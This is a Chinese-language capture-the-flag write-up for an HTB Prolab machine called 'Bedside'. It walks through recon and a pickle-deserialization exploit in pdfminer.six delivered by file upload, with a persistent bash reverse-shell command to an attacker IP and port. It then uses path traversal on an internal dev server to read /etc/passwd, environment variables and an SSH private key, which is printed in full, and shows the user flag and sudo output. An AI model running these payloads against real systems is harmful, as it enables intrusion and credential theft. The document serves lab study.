---
title: Bedside
date: 2026-09-13 21:42:13
categories:
  - prolabs
tags:
  - HTB
  - Prolab
  - Bedside
  - 内网渗透
---
# **Bedside**

![image-20260911212011154](/images/prolabs/bedside/20260911212011289.png)

## 信息收集

### 扫描端口

```shell
──(root㉿kali)-[~/桌面]
└─# nmap -T4 10.129.38.34     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-11 09:21 -0400
Nmap scan report for Bedside.md (10.129.38.34)
Host is up (1.3s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp

Nmap done: 1 IP address (1 host up) scanned in 11.68 seconds

```

粗略扫描了一下

3000端口是关闭的

![image-20260911212439288](/images/prolabs/bedside/20260911212439334.png)

接下来

### 探索指纹信息

先看web页面

![image-20260911212652579](/images/prolabs/bedside/20260911212652641.png)

```shell
─(root㉿kali)-[~/桌面]
└─# whatweb http://bedside.htb/                                                     
http://bedside.htb/ [200 OK] Apache[2.4.68], Country[RESERVED][ZZ], Email[contact@bedside.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.68 (Debian)], IP[10.129.38.34], Title[Bedside Clinic - bedside.htb]
                                                                                                                                                                                                              
```

有个邮件是contact@bedside.htb不知道有没有用

### 子域名爆破

```shell
ffuf -u http://10.129.38.34 \
  -H "Host: FUZZ.bedside.htb" \
  -w /usr/share/wordlists/dirb/common.txt \
  -fs 10918
```

```
发现
research.bedside.htb &nbsp; &nbsp;(200, 与主站不同)
```

发现文件上传

![image-20260911214017383](/images/prolabs/bedside/20260911214017486.png)

指纹探测一下

```shell
─(root㉿kali)-[~/桌面]
└─# whatweb http://research.bedside.htb/                                            
http://research.bedside.htb/ [200 OK] Apache[2.4.68], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.68 (Debian)], IP[10.129.248.191], Title[Bedside Research Portal - research.bedside.htb], X-Powered-By[pdfminer.six]
```

这里重新开了个环境

![image-20260913193145801](/images/prolabs/bedside/20260913193153121.png)

一个**未经认证的上传表**单，用于医学图像、DICOM、PDF和归档，内容如下 有些格式是在AI训练前转换的。这句话就是“变形”——转化意味着 异步后端解析器，不是被动存储。响应头封住了它：。`X-Powered-By: pdfminer.six`

![image-20260913193623294](/images/prolabs/bedside/20260913193623392.png)

## 漏洞探测

pdfminer.six是pdfminer开源的一款用于从PDF文档中提取信息的工具。

pdfminer.six 20251230之前版本存在安全漏洞，该漏洞源于CMap加载机制中使用Python pickle反序列化CMap缓存文件而未经验证，可能导致任意代码执行或权限提升。

### CVE-2025-70559:

pdfminer.six CMap加载机制不安全反序列化漏洞

#### 漏洞概述

pdfminer.six是Python中广泛使用的PDF文档解析库，支持PDF内容提取、文本分析和文档转换等功能。该漏洞存在于pdfminer.six 20251230之前版本的CMap（C Character Map）加载机制中。库在处理PDF文档的字符映射表时，使用Python pickle模块反序列化CMap缓存文件，但缺乏对反序列化数据的有效验证和完整性检查。攻击者可以通过在应用程序可访问的位置植入恶意的pickle文件，当库加载CMap资源时自动触发反序列化过程，从而实现任意代码执行或权限提升。该漏洞是CVE-2025-64512的不完整修复，表明之前的补丁未能彻底解决pickle反序列化的安全问题。由于pdfminer.six在文档处理、数据提取和PDF解析等场景中应用广泛，此漏洞可能影响大量使用该库的系统和服务。

#### 技术细节

pdfminer.six库中的CMap加载模块（CMap.py或相关文件）在初始化时尝试从缓存文件加载预处理的字符映射数据。这些缓存文件以pickle格式存储以提高加载效率。然而，代码直接使用pickle.load()或pickle.loads()反序列化数据而未进行任何签名验证或数据完整性校验。攻击者可以利用Python pickle的反序列化机制构造恶意对象，在反序列化过程中自动触发__reduce__或__reduce_ex__等魔术方法执行任意代码。由于CMap资源路径通常可由应用程序配置文件指定或通过相对路径解析，攻击者可以将恶意pickle文件放置在预期的缓存目录中，等待应用程序加载时触发。漏洞利用的关键在于pdfminer.six未对缓存文件实施加密签名或HMAC校验，且未使用受限的反序列化方式如禁用危险操作或使用allow_unsafe_classes=False参数。此问题与CVE-2025-64512相关，表明开发者可能仅修复了部分代码路径但遗漏了其他调用点。

#### 漏洞利用

最终确定漏洞为补丁版也就是

### CVE-2025-64512

```shell
git clone https://github.com/BardLaudian/CVE-2025-64512.git
cd CVE-2025-64512

```

利用

```shell
python3 gen_payload.py \
  --path "/var/www/research.bedside.htb/uploads/bedside" \
  --command "setsid bash -c 'while true; do bash -i >& /dev/tcp/10.10.15.202/4444 0>&1; sleep 5; done' >/dev/null 2>&1 &" \
  --pdf-out trigger.pdf \
  --gz-out bedside.pickle.gz

curl -F 'uploadFile=@bedside.pickle.gz;type=application/gzip' http://research.bedside.htb/
curl -F 'uploadFile=@trigger.pdf;type=application/pdf'        http://research.bedside.htb/
rlwrap nc -lvnp 4444

```

成功rce

![image-20260913200227816](/images/prolabs/bedside/20260913200227865.png)

## 入口机信息收集

```shell
datawrangler@data-wrangler:/app$ cat pdf_watcher.py               cat pdf_watcher.py
cat pdf_watcher.py
import subprocess
import glob
import os
import time
import sys
import uuid
import stat
from pathlib import Path

# Container paths
#UPLOAD_DIR = "/var/www/html/uploads"
UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
OUTPUT_DIR = "/datastore/staging"

TIMEOUT = 10
SLEEP_INTERVAL = 30

os.makedirs(OUTPUT_DIR, exist_ok=True)

def is_suspicious_filename(name: str) -> bool:
    if name.startswith("/") or ".." in name or name.startswith("-"):
        return True
    if any(ord(ch) < 32 for ch in name):
        return True
    return False

def process_pdf(pdf_path, randomized_name):
    filename = os.path.basename(pdf_path)

    reason = None

    # Basic filename check
    if is_suspicious_filename(filename):
        reason = "suspicious filename"
    # Reject symlinks
    else:
        st = os.lstat(pdf_path)
        if stat.S_ISLNK(st.st_mode):
            reason = "symlink"
        # Reject non-regular files
        elif not stat.S_ISREG(st.st_mode):
            reason = "non-regular file"

    if reason:
        print(f"[DEBUG] Skipping {filename}: {reason}")
        return

    output_file = os.path.join(OUTPUT_DIR, f"{randomized_name}.txt")

    try:
        subprocess.run(
            ["pdf2txt.py", pdf_path, "-o", output_file],
            timeout=TIMEOUT,
            check=True
        )
        print(f"Processed: {pdf_path} -> {output_file}")
    except subprocess.TimeoutExpired:
        print(f"Timeout expired for {pdf_path}, skipping...")
    except subprocess.CalledProcessError as e:
        print(f"Error processing {pdf_path}: {e}")
    except Exception as e:
        print(f"Unexpected error processing {pdf_path}: {e}")

def main():
    while True:
        pdf_files = glob.glob(os.path.join(UPLOAD_DIR, "*.pdf"))
        if not pdf_files:
            print("No PDF files found.")
            time.sleep(SLEEP_INTERVAL)
            continue

        for pdf_path in pdf_files:
            randomized_name = str(uuid.uuid4())
            process_pdf(pdf_path, randomized_name)

        time.sleep(SLEEP_INTERVAL)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Shutting down...")
        sys.exit(0)

```

```shell
datawrangler@data-wrangler:/app$ cat requirements.txt             cat requirements.txt
cat requirements.txt
pdfminer.six==20250506

```

查看这俩文件

源码确认了几件事，方向已经很清楚了：

- `pdf_watcher.py` 以 **datawrangler** 身份运行，扫 `*.pdf` → `pdf2txt.py` → 输出 `.txt` 到 `/datastore/staging/{uuid}.txt`
- `requirements.txt: pdfminer.six==20250506`，正是 CVE-2025-64512/70559 的脆弱版本
- `/datastore` 是共享卷，**必然有另一个高权限进程在读写它**

接着

```shell
cd /datastore
```

![image-20260913201056057](/images/prolabs/bedside/20260913201056125.png)

啥也没发现

查看挂载

```shell
datawrangler@data-wrangler:/app$ cat /proc/mounts                 cat /proc/mounts
cat /proc/mounts
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/7HDUEYKTTG45L4C43CV564OD65:/var/lib/docker/overlay2/l/KURPDQVRNR6XVYP7D6WNQDLWYX:/var/lib/docker/overlay2/l/L3KONLTKIS7CH5CPF6XIBHOUSH:/var/lib/docker/overlay2/l/OBCMVDVNVOJBNILBSXY7CQQXHB:/var/lib/docker/overlay2/l/35JYJ6QYGJHWA47522K25IMCFX:/var/lib/docker/overlay2/l/GGCVBBNRZLKEDZVC3HHPSN5LLM:/var/lib/docker/overlay2/l/SWVPDOIXWVJ5PX6M6PCVAHHAIE:/var/lib/docker/overlay2/l/4XQ3K3IIUJJAVD4PEHO22P3QZD:/var/lib/docker/overlay2/l/ZBZ5256YLH4MO6GSFZGK45QC75:/var/lib/docker/overlay2/l/DXXFAGL3GJWRERGZWQ27ESXH6H:/var/lib/docker/overlay2/l/TOIMXWLQJV7PTXA6C77IUZDS53,upperdir=/var/lib/docker/overlay2/2a1c86f095a2ecc793064a3f0e84e026a686791239888e4b79dca307edb11132/diff,workdir=/var/lib/docker/overlay2/2a1c86f095a2ecc793064a3f0e84e026a686791239888e4b79dca307edb11132/work 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
cgroup /sys/fs/cgroup cgroup2 ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k,inode64 0 0
/dev/sda4 /datastore ext4 rw,relatime,errors=remount-ro 0 0
/dev/sda4 /etc/resolv.conf ext4 rw,relatime,errors=remount-ro 0 0
/dev/sda4 /etc/hostname ext4 rw,relatime,errors=remount-ro 0 0
/dev/sda4 /etc/hosts ext4 rw,relatime,errors=remount-ro 0 0
/dev/sda4 /var/www/research.bedside.htb/uploads ext4 rw,relatime,errors=remount-ro 0 0
devpts /dev/console devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
proc /proc/bus proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/fs proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/irq proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/sys proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0
tmpfs /proc/acpi tmpfs ro,relatime,inode64 0 0
tmpfs /proc/kcore tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /sys/firmware tmpfs ro,relatime,inode64 0 0
datawrangler@data-wrangler:/app$ cat /proc/self/mountinfo | grep -cat /proc/self/mountinfo | grep -vE "proc|sysfs|devpts|tmpfs|cgroup|mqueue|shm|overlay"
cat /proc/self/mountinfo | grep -vE "proc|sysfs|devpts|tmpfs|cgroup|mqueue|shm|overlay"
249 241 8:4 /datastore /datastore rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
250 241 8:4 /var/lib/docker/containers/a77f66b659a6338ce2d50d10b51d26d40e69a9d4f4c82bba9fb549b1574c45f4/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
251 241 8:4 /var/lib/docker/containers/a77f66b659a6338ce2d50d10b51d26d40e69a9d4f4c82bba9fb549b1574c45f4/hostname /etc/hostname rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
252 241 8:4 /var/lib/docker/containers/a77f66b659a6338ce2d50d10b51d26d40e69a9d4f4c82bba9fb549b1574c45f4/hosts /etc/hosts rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
253 241 8:4 /var/www/research.bedside.htb/uploads /var/www/research.bedside.htb/uploads rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
datawrangler@data-wrangler:/app$ 

```

`/proc/mounts` 暴露了一条**关键信息**：

```
/dev/sda4 /datastore                          ext4 rw
/dev/sda4 /etc/resolv.conf                    ext4 rw
/dev/sda4 /etc/hostname                       ext4 rw
/dev/sda4 /etc/hosts                          ext4 rw
/dev/sda4 /var/www/research.bedside.htb/uploads ext4 rw
```

含义：

1. `/datastore`、`/etc/hosts`、`/etc/hostname`、`/etc/resolv.conf`、**web 的 uploads 目录**，全都来自宿主同一个块设备 **`/dev/sda4`**，是 **bind mount**（不是 Docker named volume）。
2. **web 容器和 datawrangler 容器共享宿主 `/dev/sda4` 上的目录**，所以上传的 pickle 能被 web 容器那边的 pdf_watcher 读到。

之前扫端口扫到个3000，扫描docker网关

```shell
for port in 80 3000; do curl -s -o /dev/null -w "$port: %{http_code}\n" http://172.17.0.1:$port/; done
```

![image-20260913202512571](/images/prolabs/bedside/20260913202512685.png)

3000端口返回200

访问一下，看看怎么个事

```
curl -s http://172.17.0.1:3000/ -o /tmp/p.html
wc -c /tmp/p.html
cat /tmp/p.html
```

```html
<head>
  <meta charset="UTF-8">
  <title>Bedside Clinic - Image Viewer</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f4f9fc;
      color: #0b3d91;
      margin: 0;
      padding: 20px;
    }

    h1 {
      text-align: center;
      color: #0b3d91;
    }

    #root {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .viewer {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 20px;
    }

    .mask-grid {
      display: grid;
      grid-template-columns: repeat(5, 40px);
      gap: 2px;
      margin-top: 10px;
    }

    .cell {
      width: 40px;
      height: 40px;
      display: flex;
      justify-content: center;
      align-items: center;
      font-weight: bold;
      border-radius: 4px;
      color: #ffffff;
    }

    .cell-0 { background-color: #a0c4ff; }
    .cell-1 { background-color: #0077b6; }

    .controls {
      margin-top: 15px;
      display: flex;
      gap: 10px;
      align-items: center;
    }

    .controls button {
      padding: 6px 12px;
      font-size: 14px;
      border-radius: 4px;
      border: none;
      background-color: #0b3d91;
      color: white;
      cursor: pointer;
    }

    .controls button:disabled {
      background-color: #a0c4ff;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <h1>Bedside Clinic - Image Viewer</h1>
  <div id="root"></div>

  <script type="module">
        import React from './vendor/react.js';
        import ReactDOM from './vendor/react-dom.js';
        import _ from './vendor/lodash.js';

    // Simulate fetching multi-slice MRI + mask data
    async function fetchSlices() {
      // For demo: generate 5 slices with random masks
      const slices = [];
      for (let i = 0; i < 5; i++) {
        const mask = Array.from({ length: 5 }, () =>
          Array.from({ length: 5 }, () => Math.round(Math.random()))
        );
        slices.push({ id: `slice_${i+1}`, mask });
      }
      return slices;
    }

    function MaskGrid({ mask }) {
      return (
        <div className="mask-grid">
          {mask.flat().map((cell, idx) => (
            <div key={idx} className={`cell cell-${cell}`}>{cell}</div>
          ))}
        </div>
      );
    }

    function Viewer({ slices }) {
      const [currentIndex, setCurrentIndex] = React.useState(0);
      const slice = slices[currentIndex];

      const prevSlice = () => setCurrentIndex(idx => Math.max(0, idx - 1));
      const nextSlice = () => setCurrentIndex(idx => Math.min(slices.length - 1, idx + 1));

      return (
        <div className="viewer">
          <h2>{slice.id}</h2>
          <MaskGrid mask={slice.mask} />
          <div className="controls">
            <button onClick={prevSlice} disabled={currentIndex === 0}>Previous Slice</button>
            <span>Slice {currentIndex + 1} / {slices.length}</span>
            <button onClick={nextSlice} disabled={currentIndex === slices.length - 1}>Next Slice</button>
          </div>
        </div>
      );
    }

    function App() {
      const [slices, setSlices] = React.useState([]);

      React.useEffect(() => {
        fetchSlices().then(setSlices);
      }, []);

      return slices.length > 0 ? <Viewer slices={slices} /> : <p>Loading slices...</p>;
    }

    ReactDOM.render(<App />, document.getElementById('root'));
  </script>
</body>
</html>
<script type="module">import createHotContext from"/@hmr";const hot=createHotContext("/index.html");hot.watch(()=>location.reload());</script><script>console.log("%c💚 Built with esm.sh/x, please uncheck \"Disable cache\" in Network tab for better DX!", "color:green")</script>
```

### 关键线索：esm.sh/x

### 内部ESM服务

`esm.sh/x` 是一个**浏览器端 ESM 转译/开发服务器**

端口3000是从外部过滤的，但接应来自集装箱内部。确实如此 一台配备热模块重载端点的ESM开发服务器。常规API路径404;该 弱点位于包解析路径，需要 CURL 不 将遍历归一化：`127.0.0.1``--path-as-is`

```
python3 -c "
import socket
s=socket.socket(); s.settimeout(5); s.connect(('172.17.0.1',3000))
s.sendall(b'GET /../../../../etc/passwd HTTP/1.1\r\nHost: 172.17.0.1:3000\r\nConnection: close\r\n\r\n')
print(s.recv(8192).decode(errors='replace'))
"
```

![image-20260913204204212](/images/prolabs/bedside/20260913204204326.png)

成功文件读取

```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/n

```

```shell
python3 -c "
import socket
s=socket.socket(); s.settimeout(5); s.connect(('172.17.0.1',3000))
s.sendall(b'GET /../../../../proc/self/environ HTTP/1.1\r\nHost: 172.17.0.1:3000\r\nConnection: close\r\n\r\n')
print(s.recv(8192).decode(errors='replace'))
"
```

获得

```shell
HTTP/1.1 200 OK
Cache-Control: max-age=0, must-revalidate
Content-Type: application/octet-stream
Etag: w/"1789298751659-0-136"
Date: Sun, 13 Sep 2026 12:50:04 GMT
Content-Length: 381
Connection: close

LANG=en_GB.UTF-8LANGUAGE=en_GB:enPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/binUSER=developerLOGNAME=developerHOME=/home/developerSHELL=/bin/bashINVOCATION_ID=ab8062854df24587b0d0a03b0af0e7e3JOURNAL_STREAM=9:12199SYSTEMD_EXEC_PID=1430MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/esm.service/memory.pressureMEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=

```

其中

USER=developer
LOGNAME=developer
HOME=/home/developer
SHELL=/bin/bash

这说明这个服务进程是以 `developer` 用户运行的，并且它认为自己的家目录是 `/home/developer`。

读取ssh的密钥

```
python3 -c "
import socket
s=socket.socket(); s.settimeout(5); s.connect(('172.17.0.1',3000))
s.sendall(b'GET /../../../../home/developer/.ssh/id_rsa HTTP/1.1\r\nHost: 172.17.0.1:3000\r\nConnection: close\r\n\r\n')
print(s.recv(8192).decode(errors='replace'))
"
```

成功读取

![image-20260913205330580](/images/prolabs/bedside/20260913205330772.png)

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----

```

```shell
cat > id_beside <<'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 id_beside
ssh -i  id_beside developer@10.129.248.191
```

![image-20260913205804700](/images/prolabs/bedside/20260913205804792.png)

## 拿到user.txt

```shell
permitted by applicable law.
developer@bedside:~$ ls
projects  user.txt
developer@bedside:~$ cat user.txt
a2382b059b2210245a20bc7d14aef58c
developer@bedside:~$ 

```

## 提权

```shell
sudo -l

eveloper@bedside:~$ sudo -l
Matching Defaults entries for developer on bedside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
developer@bedside:~$ 

```

读这个python文件

```shell
developer@bedside:~$ cat /opt/trainer/bedside_trainer.py
#!/usr/bin/env python3
"""
Bedside Clinic - MONAI trainer (v0.1.0-beta)

This software is an internal beta release intended for use by company staff and developers
for testing, experimentation, and development purposes only.

Key points:

- Staff must **exercise caution** and ensure proper backups of any data used with this tool.
- This tool should **not be used for clinical decision-making** or in patient care.
- Further development, testing, and validation are required before any production deployment.

Usage:
    python bedside_trainer.py [--epochs N] [--batch-size N] [--lr LR] [--scanner /dev/usbscanner0]

Notes:
- Root access is required if specifying a hardware scanner.
- RAW_DIR is currently a placeholder for future integration. Preprocessing features will be added in the future to handle more complex files (DICOM, NIfTI, etc.)
- Current data flow is as follows: [staging/] > [processed/] > (DataLoader) > model
- Script is currently fully functional with image files (jpeg, png, etc.). Refer to allowed extensions for supported types. 

"""

import os
import sys
import shutil
import argparse
from pathlib import Path
from datetime import datetime
import logging
import warnings
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.tensorboard import SummaryWriter
from torch.utils.data import DataLoader

# MONAI imports
warnings.filterwarnings("ignore", category=FutureWarning)
from monai.data import Dataset, CacheDataset
from monai.transforms import (
    Compose, LoadImaged, EnsureChannelFirstd, ScaleIntensityd,
    RandSpatialCropd, ToTensord, EnsureTyped, ResizeWithPadOrCropd
)
from monai.handlers import CheckpointLoader  # <-- Correct import

# --------------------------
# Datastore paths
# --------------------------
DATASTORE_ROOT = Path("/datastore")
CHECKPOINT_DIR = DATASTORE_ROOT / "checkpoints"
LOGS_DIR = DATASTORE_ROOT / "logs"
MODELS_DIR = DATASTORE_ROOT / "models"
PROCESSED_DIR = DATASTORE_ROOT / "processed"
RAW_DIR = DATASTORE_ROOT / "raw"
STAGING_DIR = DATASTORE_ROOT / "staging"

for d in (CHECKPOINT_DIR, LOGS_DIR, MODELS_DIR, PROCESSED_DIR, RAW_DIR, STAGING_DIR):
    d.mkdir(parents=True, exist_ok=True)

# --------------------------
# Logging setup
# --------------------------
log_file = LOGS_DIR / f"training_{datetime.now().strftime('%Y%m%d-%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# --------------------------
# File types
# --------------------------
ALLOWED_EXTS = {
    "jpeg", "jpg", "png", "bmp", "tiff", "tif",
    "gif", "dcm", "ima", "mhd", "raw", "nrrd",
    "nii", "gz", "hdr", "img", "zip", "tar", "tar.gz", "7z",
    "pdf", "txt", "npy"
}

# --------------------------
# Device
# --------------------------
DEVICE = torch.device("cuda" if torch.cuda.is_available() else "cpu")

# --------------------------
# Utility functions
# --------------------------
def find_latest_checkpoint(checkpoint_dir: Path):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None

def is_nifti(p: Path):
    return p.suffix in (".nii", ".gz") and (p.name.endswith(".nii") or p.name.endswith(".nii.gz"))

def collect_processed_files(processed_dir: Path, limit=None):
    files = [p for p in processed_dir.glob("**/*") if p.is_file() and p.suffix.lower().lstrip(".") in ALLOWED_EXTS]
    if limit:
        files = files[:limit]
    return [{"image": str(p)} for p in files]

def conservative_promote_from_staging(staging_dir: Path, processed_dir: Path, max_files=100):
    promoted = 0
    for p in sorted(staging_dir.iterdir()):
        if promoted >= max_files:
            break
        if not p.is_file():
            continue
        ext = p.suffix.lower().lstrip(".")
        if ext in ALLOWED_EXTS:
            dest = processed_dir / p.name
            try:
                shutil.move(str(p), str(dest))
                promoted += 1
            except Exception as e:
                logger.warning(f"Failed to promote {p}: {e}")
    return promoted

def prepare_dataloader_from_processed(processed_dir: Path, batch_size: int):
    data = collect_processed_files(processed_dir)
    if not data:
        return None, 0

    contains_nifti = any(is_nifti(Path(d["image"])) for d in data)

    if contains_nifti:
        transforms = Compose([
            LoadImaged(keys=["image"]),
            EnsureChannelFirstd(keys=["image"]),
            ScaleIntensityd(keys=["image"]),
            RandSpatialCropd(keys=["image"], roi_size=(64,64,64), random_size=False),
            EnsureTyped(keys=["image"])
        ])
        dataset = CacheDataset(data=data, transform=transforms, cache_rate=1.0, num_workers=1)
    else:
        transforms = Compose([
            LoadImaged(keys=["image"]),
            EnsureChannelFirstd(keys=["image"]),
            ScaleIntensityd(keys=["image"]),
            ResizeWithPadOrCropd(keys=["image"], spatial_size=(64,64)),
            ToTensord(keys=["image"]),
            EnsureTyped(keys=["image"])
        ])
        dataset = Dataset(data=data, transform=transforms)

    dataloader = DataLoader(dataset, batch_size=batch_size, shuffle=True, num_workers=1)
    return dataloader, len(data)

def build_model(dataloader=None, hidden_dim=128):
    if dataloader is None:
        raise ValueError("Dataloader must be provided to infer input size.")
    sample_batch = next(iter(dataloader))["image"].to(torch.device("cpu"))
    n_features = sample_batch.numel() // sample_batch.shape[0]
    logger.info(f"Auto-detected input features: {n_features}")
    model = nn.Sequential(
        nn.Flatten(),
        nn.Linear(n_features, hidden_dim),
        nn.ReLU(),
        nn.Linear(hidden_dim, 1)
    )
    return model

# --------------------------
# Main
# --------------------------
def main():
    parser = argparse.ArgumentParser(description="MONAI trainer with datastore integration")
    parser.add_argument("--epochs", "-e", type=int, default=50, help="Number of training epochs")
    parser.add_argument("--batch-size", "-b", type=int, default=4, help="Batch size")
    parser.add_argument("--lr", type=float, default=1e-3, help="Learning rate")
    parser.add_argument("--scanner", type=str, default=None, help="Hardware scanner device (requires root)")
    args = parser.parse_args()

    if args.scanner and os.geteuid() != 0:
        logger.error("Root access required to use a hardware scanner. Exiting.")
        sys.exit(1)

    NUM_EPOCHS = args.epochs
    BATCH_SIZE = args.batch_size
    LEARNING_RATE = args.lr
    SAVE_INTERVAL = 5

    logger.info(f"Device: {DEVICE}")

    dataloader, n_data = prepare_dataloader_from_processed(PROCESSED_DIR, BATCH_SIZE)
    if n_data == 0:
        promoted = conservative_promote_from_staging(STAGING_DIR, PROCESSED_DIR, max_files=200)
        if promoted:
            logger.info(f"Promoted {promoted} files from staging -> processed")
            dataloader, n_data = prepare_dataloader_from_processed(PROCESSED_DIR, BATCH_SIZE)
        else:
            logger.warning("No data available to train. Exiting.")
            return

    logger.info(f"Using {n_data} samples for training.")

    model = build_model(dataloader).to(DEVICE)
    optimizer = optim.Adam(model.parameters(), lr=LEARNING_RATE)
    loss_fn = nn.MSELoss()

    # --------------------------
    # Checkpoint loading (MONAI-compatible callable form)
    # --------------------------
    latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
    start_epoch = 0
    if latest_ckpt:
        logger.info(f"Found checkpoint {latest_ckpt}, loading with CheckpointLoader (callable mode)...")
        loader = CheckpointLoader(
            load_path=str(latest_ckpt),
            load_dict={"model": model, "optimizer": optimizer},
            map_location=DEVICE
        )

        # Minimal mock engine for MONAI handler compatibility
        class MockEngine:
            def __init__(self):
                self.state = type("State", (), {})()
                self.state.max_epochs = None
                self.state.epoch = 0

        engine = MockEngine()
        loader(engine)  # invoke the handler directly

        # Retrieve saved epoch if available
        if hasattr(engine.state, "epoch") and engine.state.epoch:
            start_epoch = engine.state.epoch
        elif hasattr(loader, "loaded_objects") and "epoch" in loader.loaded_objects:
            start_epoch = loader.loaded_objects["epoch"]

        logger.info(f"Resuming from epoch {start_epoch}")

    writer = SummaryWriter(log_dir=str(LOGS_DIR / datetime.now().strftime("%Y%m%d-%H%M%S")))

    # Training loop
    for epoch in range(start_epoch, NUM_EPOCHS):
        model.train()
        epoch_loss = 0.0
        for batch in dataloader:
            imgs = batch["image"].to(DEVICE)
            target = torch.zeros((imgs.shape[0], 1), device=DEVICE)

            optimizer.zero_grad()
            out = model(imgs)
            loss = loss_fn(out, target)
            loss.backward()
            optimizer.step()
            epoch_loss += float(loss.item())

        avg_loss = epoch_loss / max(1, len(dataloader))
        logger.info(f"[EPOCH {epoch+1}/{NUM_EPOCHS}] avg_loss: {avg_loss:.6f}")

        if (epoch + 1) % SAVE_INTERVAL == 0 or (epoch + 1) == NUM_EPOCHS:
            ckpt_payload = {
                "epoch": epoch + 1,
                "model": model.state_dict(),
                "optimizer": optimizer.state_dict()
            }
            ckpt_name = CHECKPOINT_DIR / f"checkpoint_epoch_{epoch+1}.pt"
            torch.save(ckpt_payload, ckpt_name)
            logger.info(f"Saved checkpoint: {ckpt_name}")

    # Save final model
    final_model_file = MODELS_DIR / f"final_model_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pt"
    torch.save({"model": model.state_dict()}, final_model_file)
    logger.info(f"Saved final model: {final_model_file}")
    logger.info("Training completed.")
    writer.close()


if __name__ == "__main__":
    main()

```

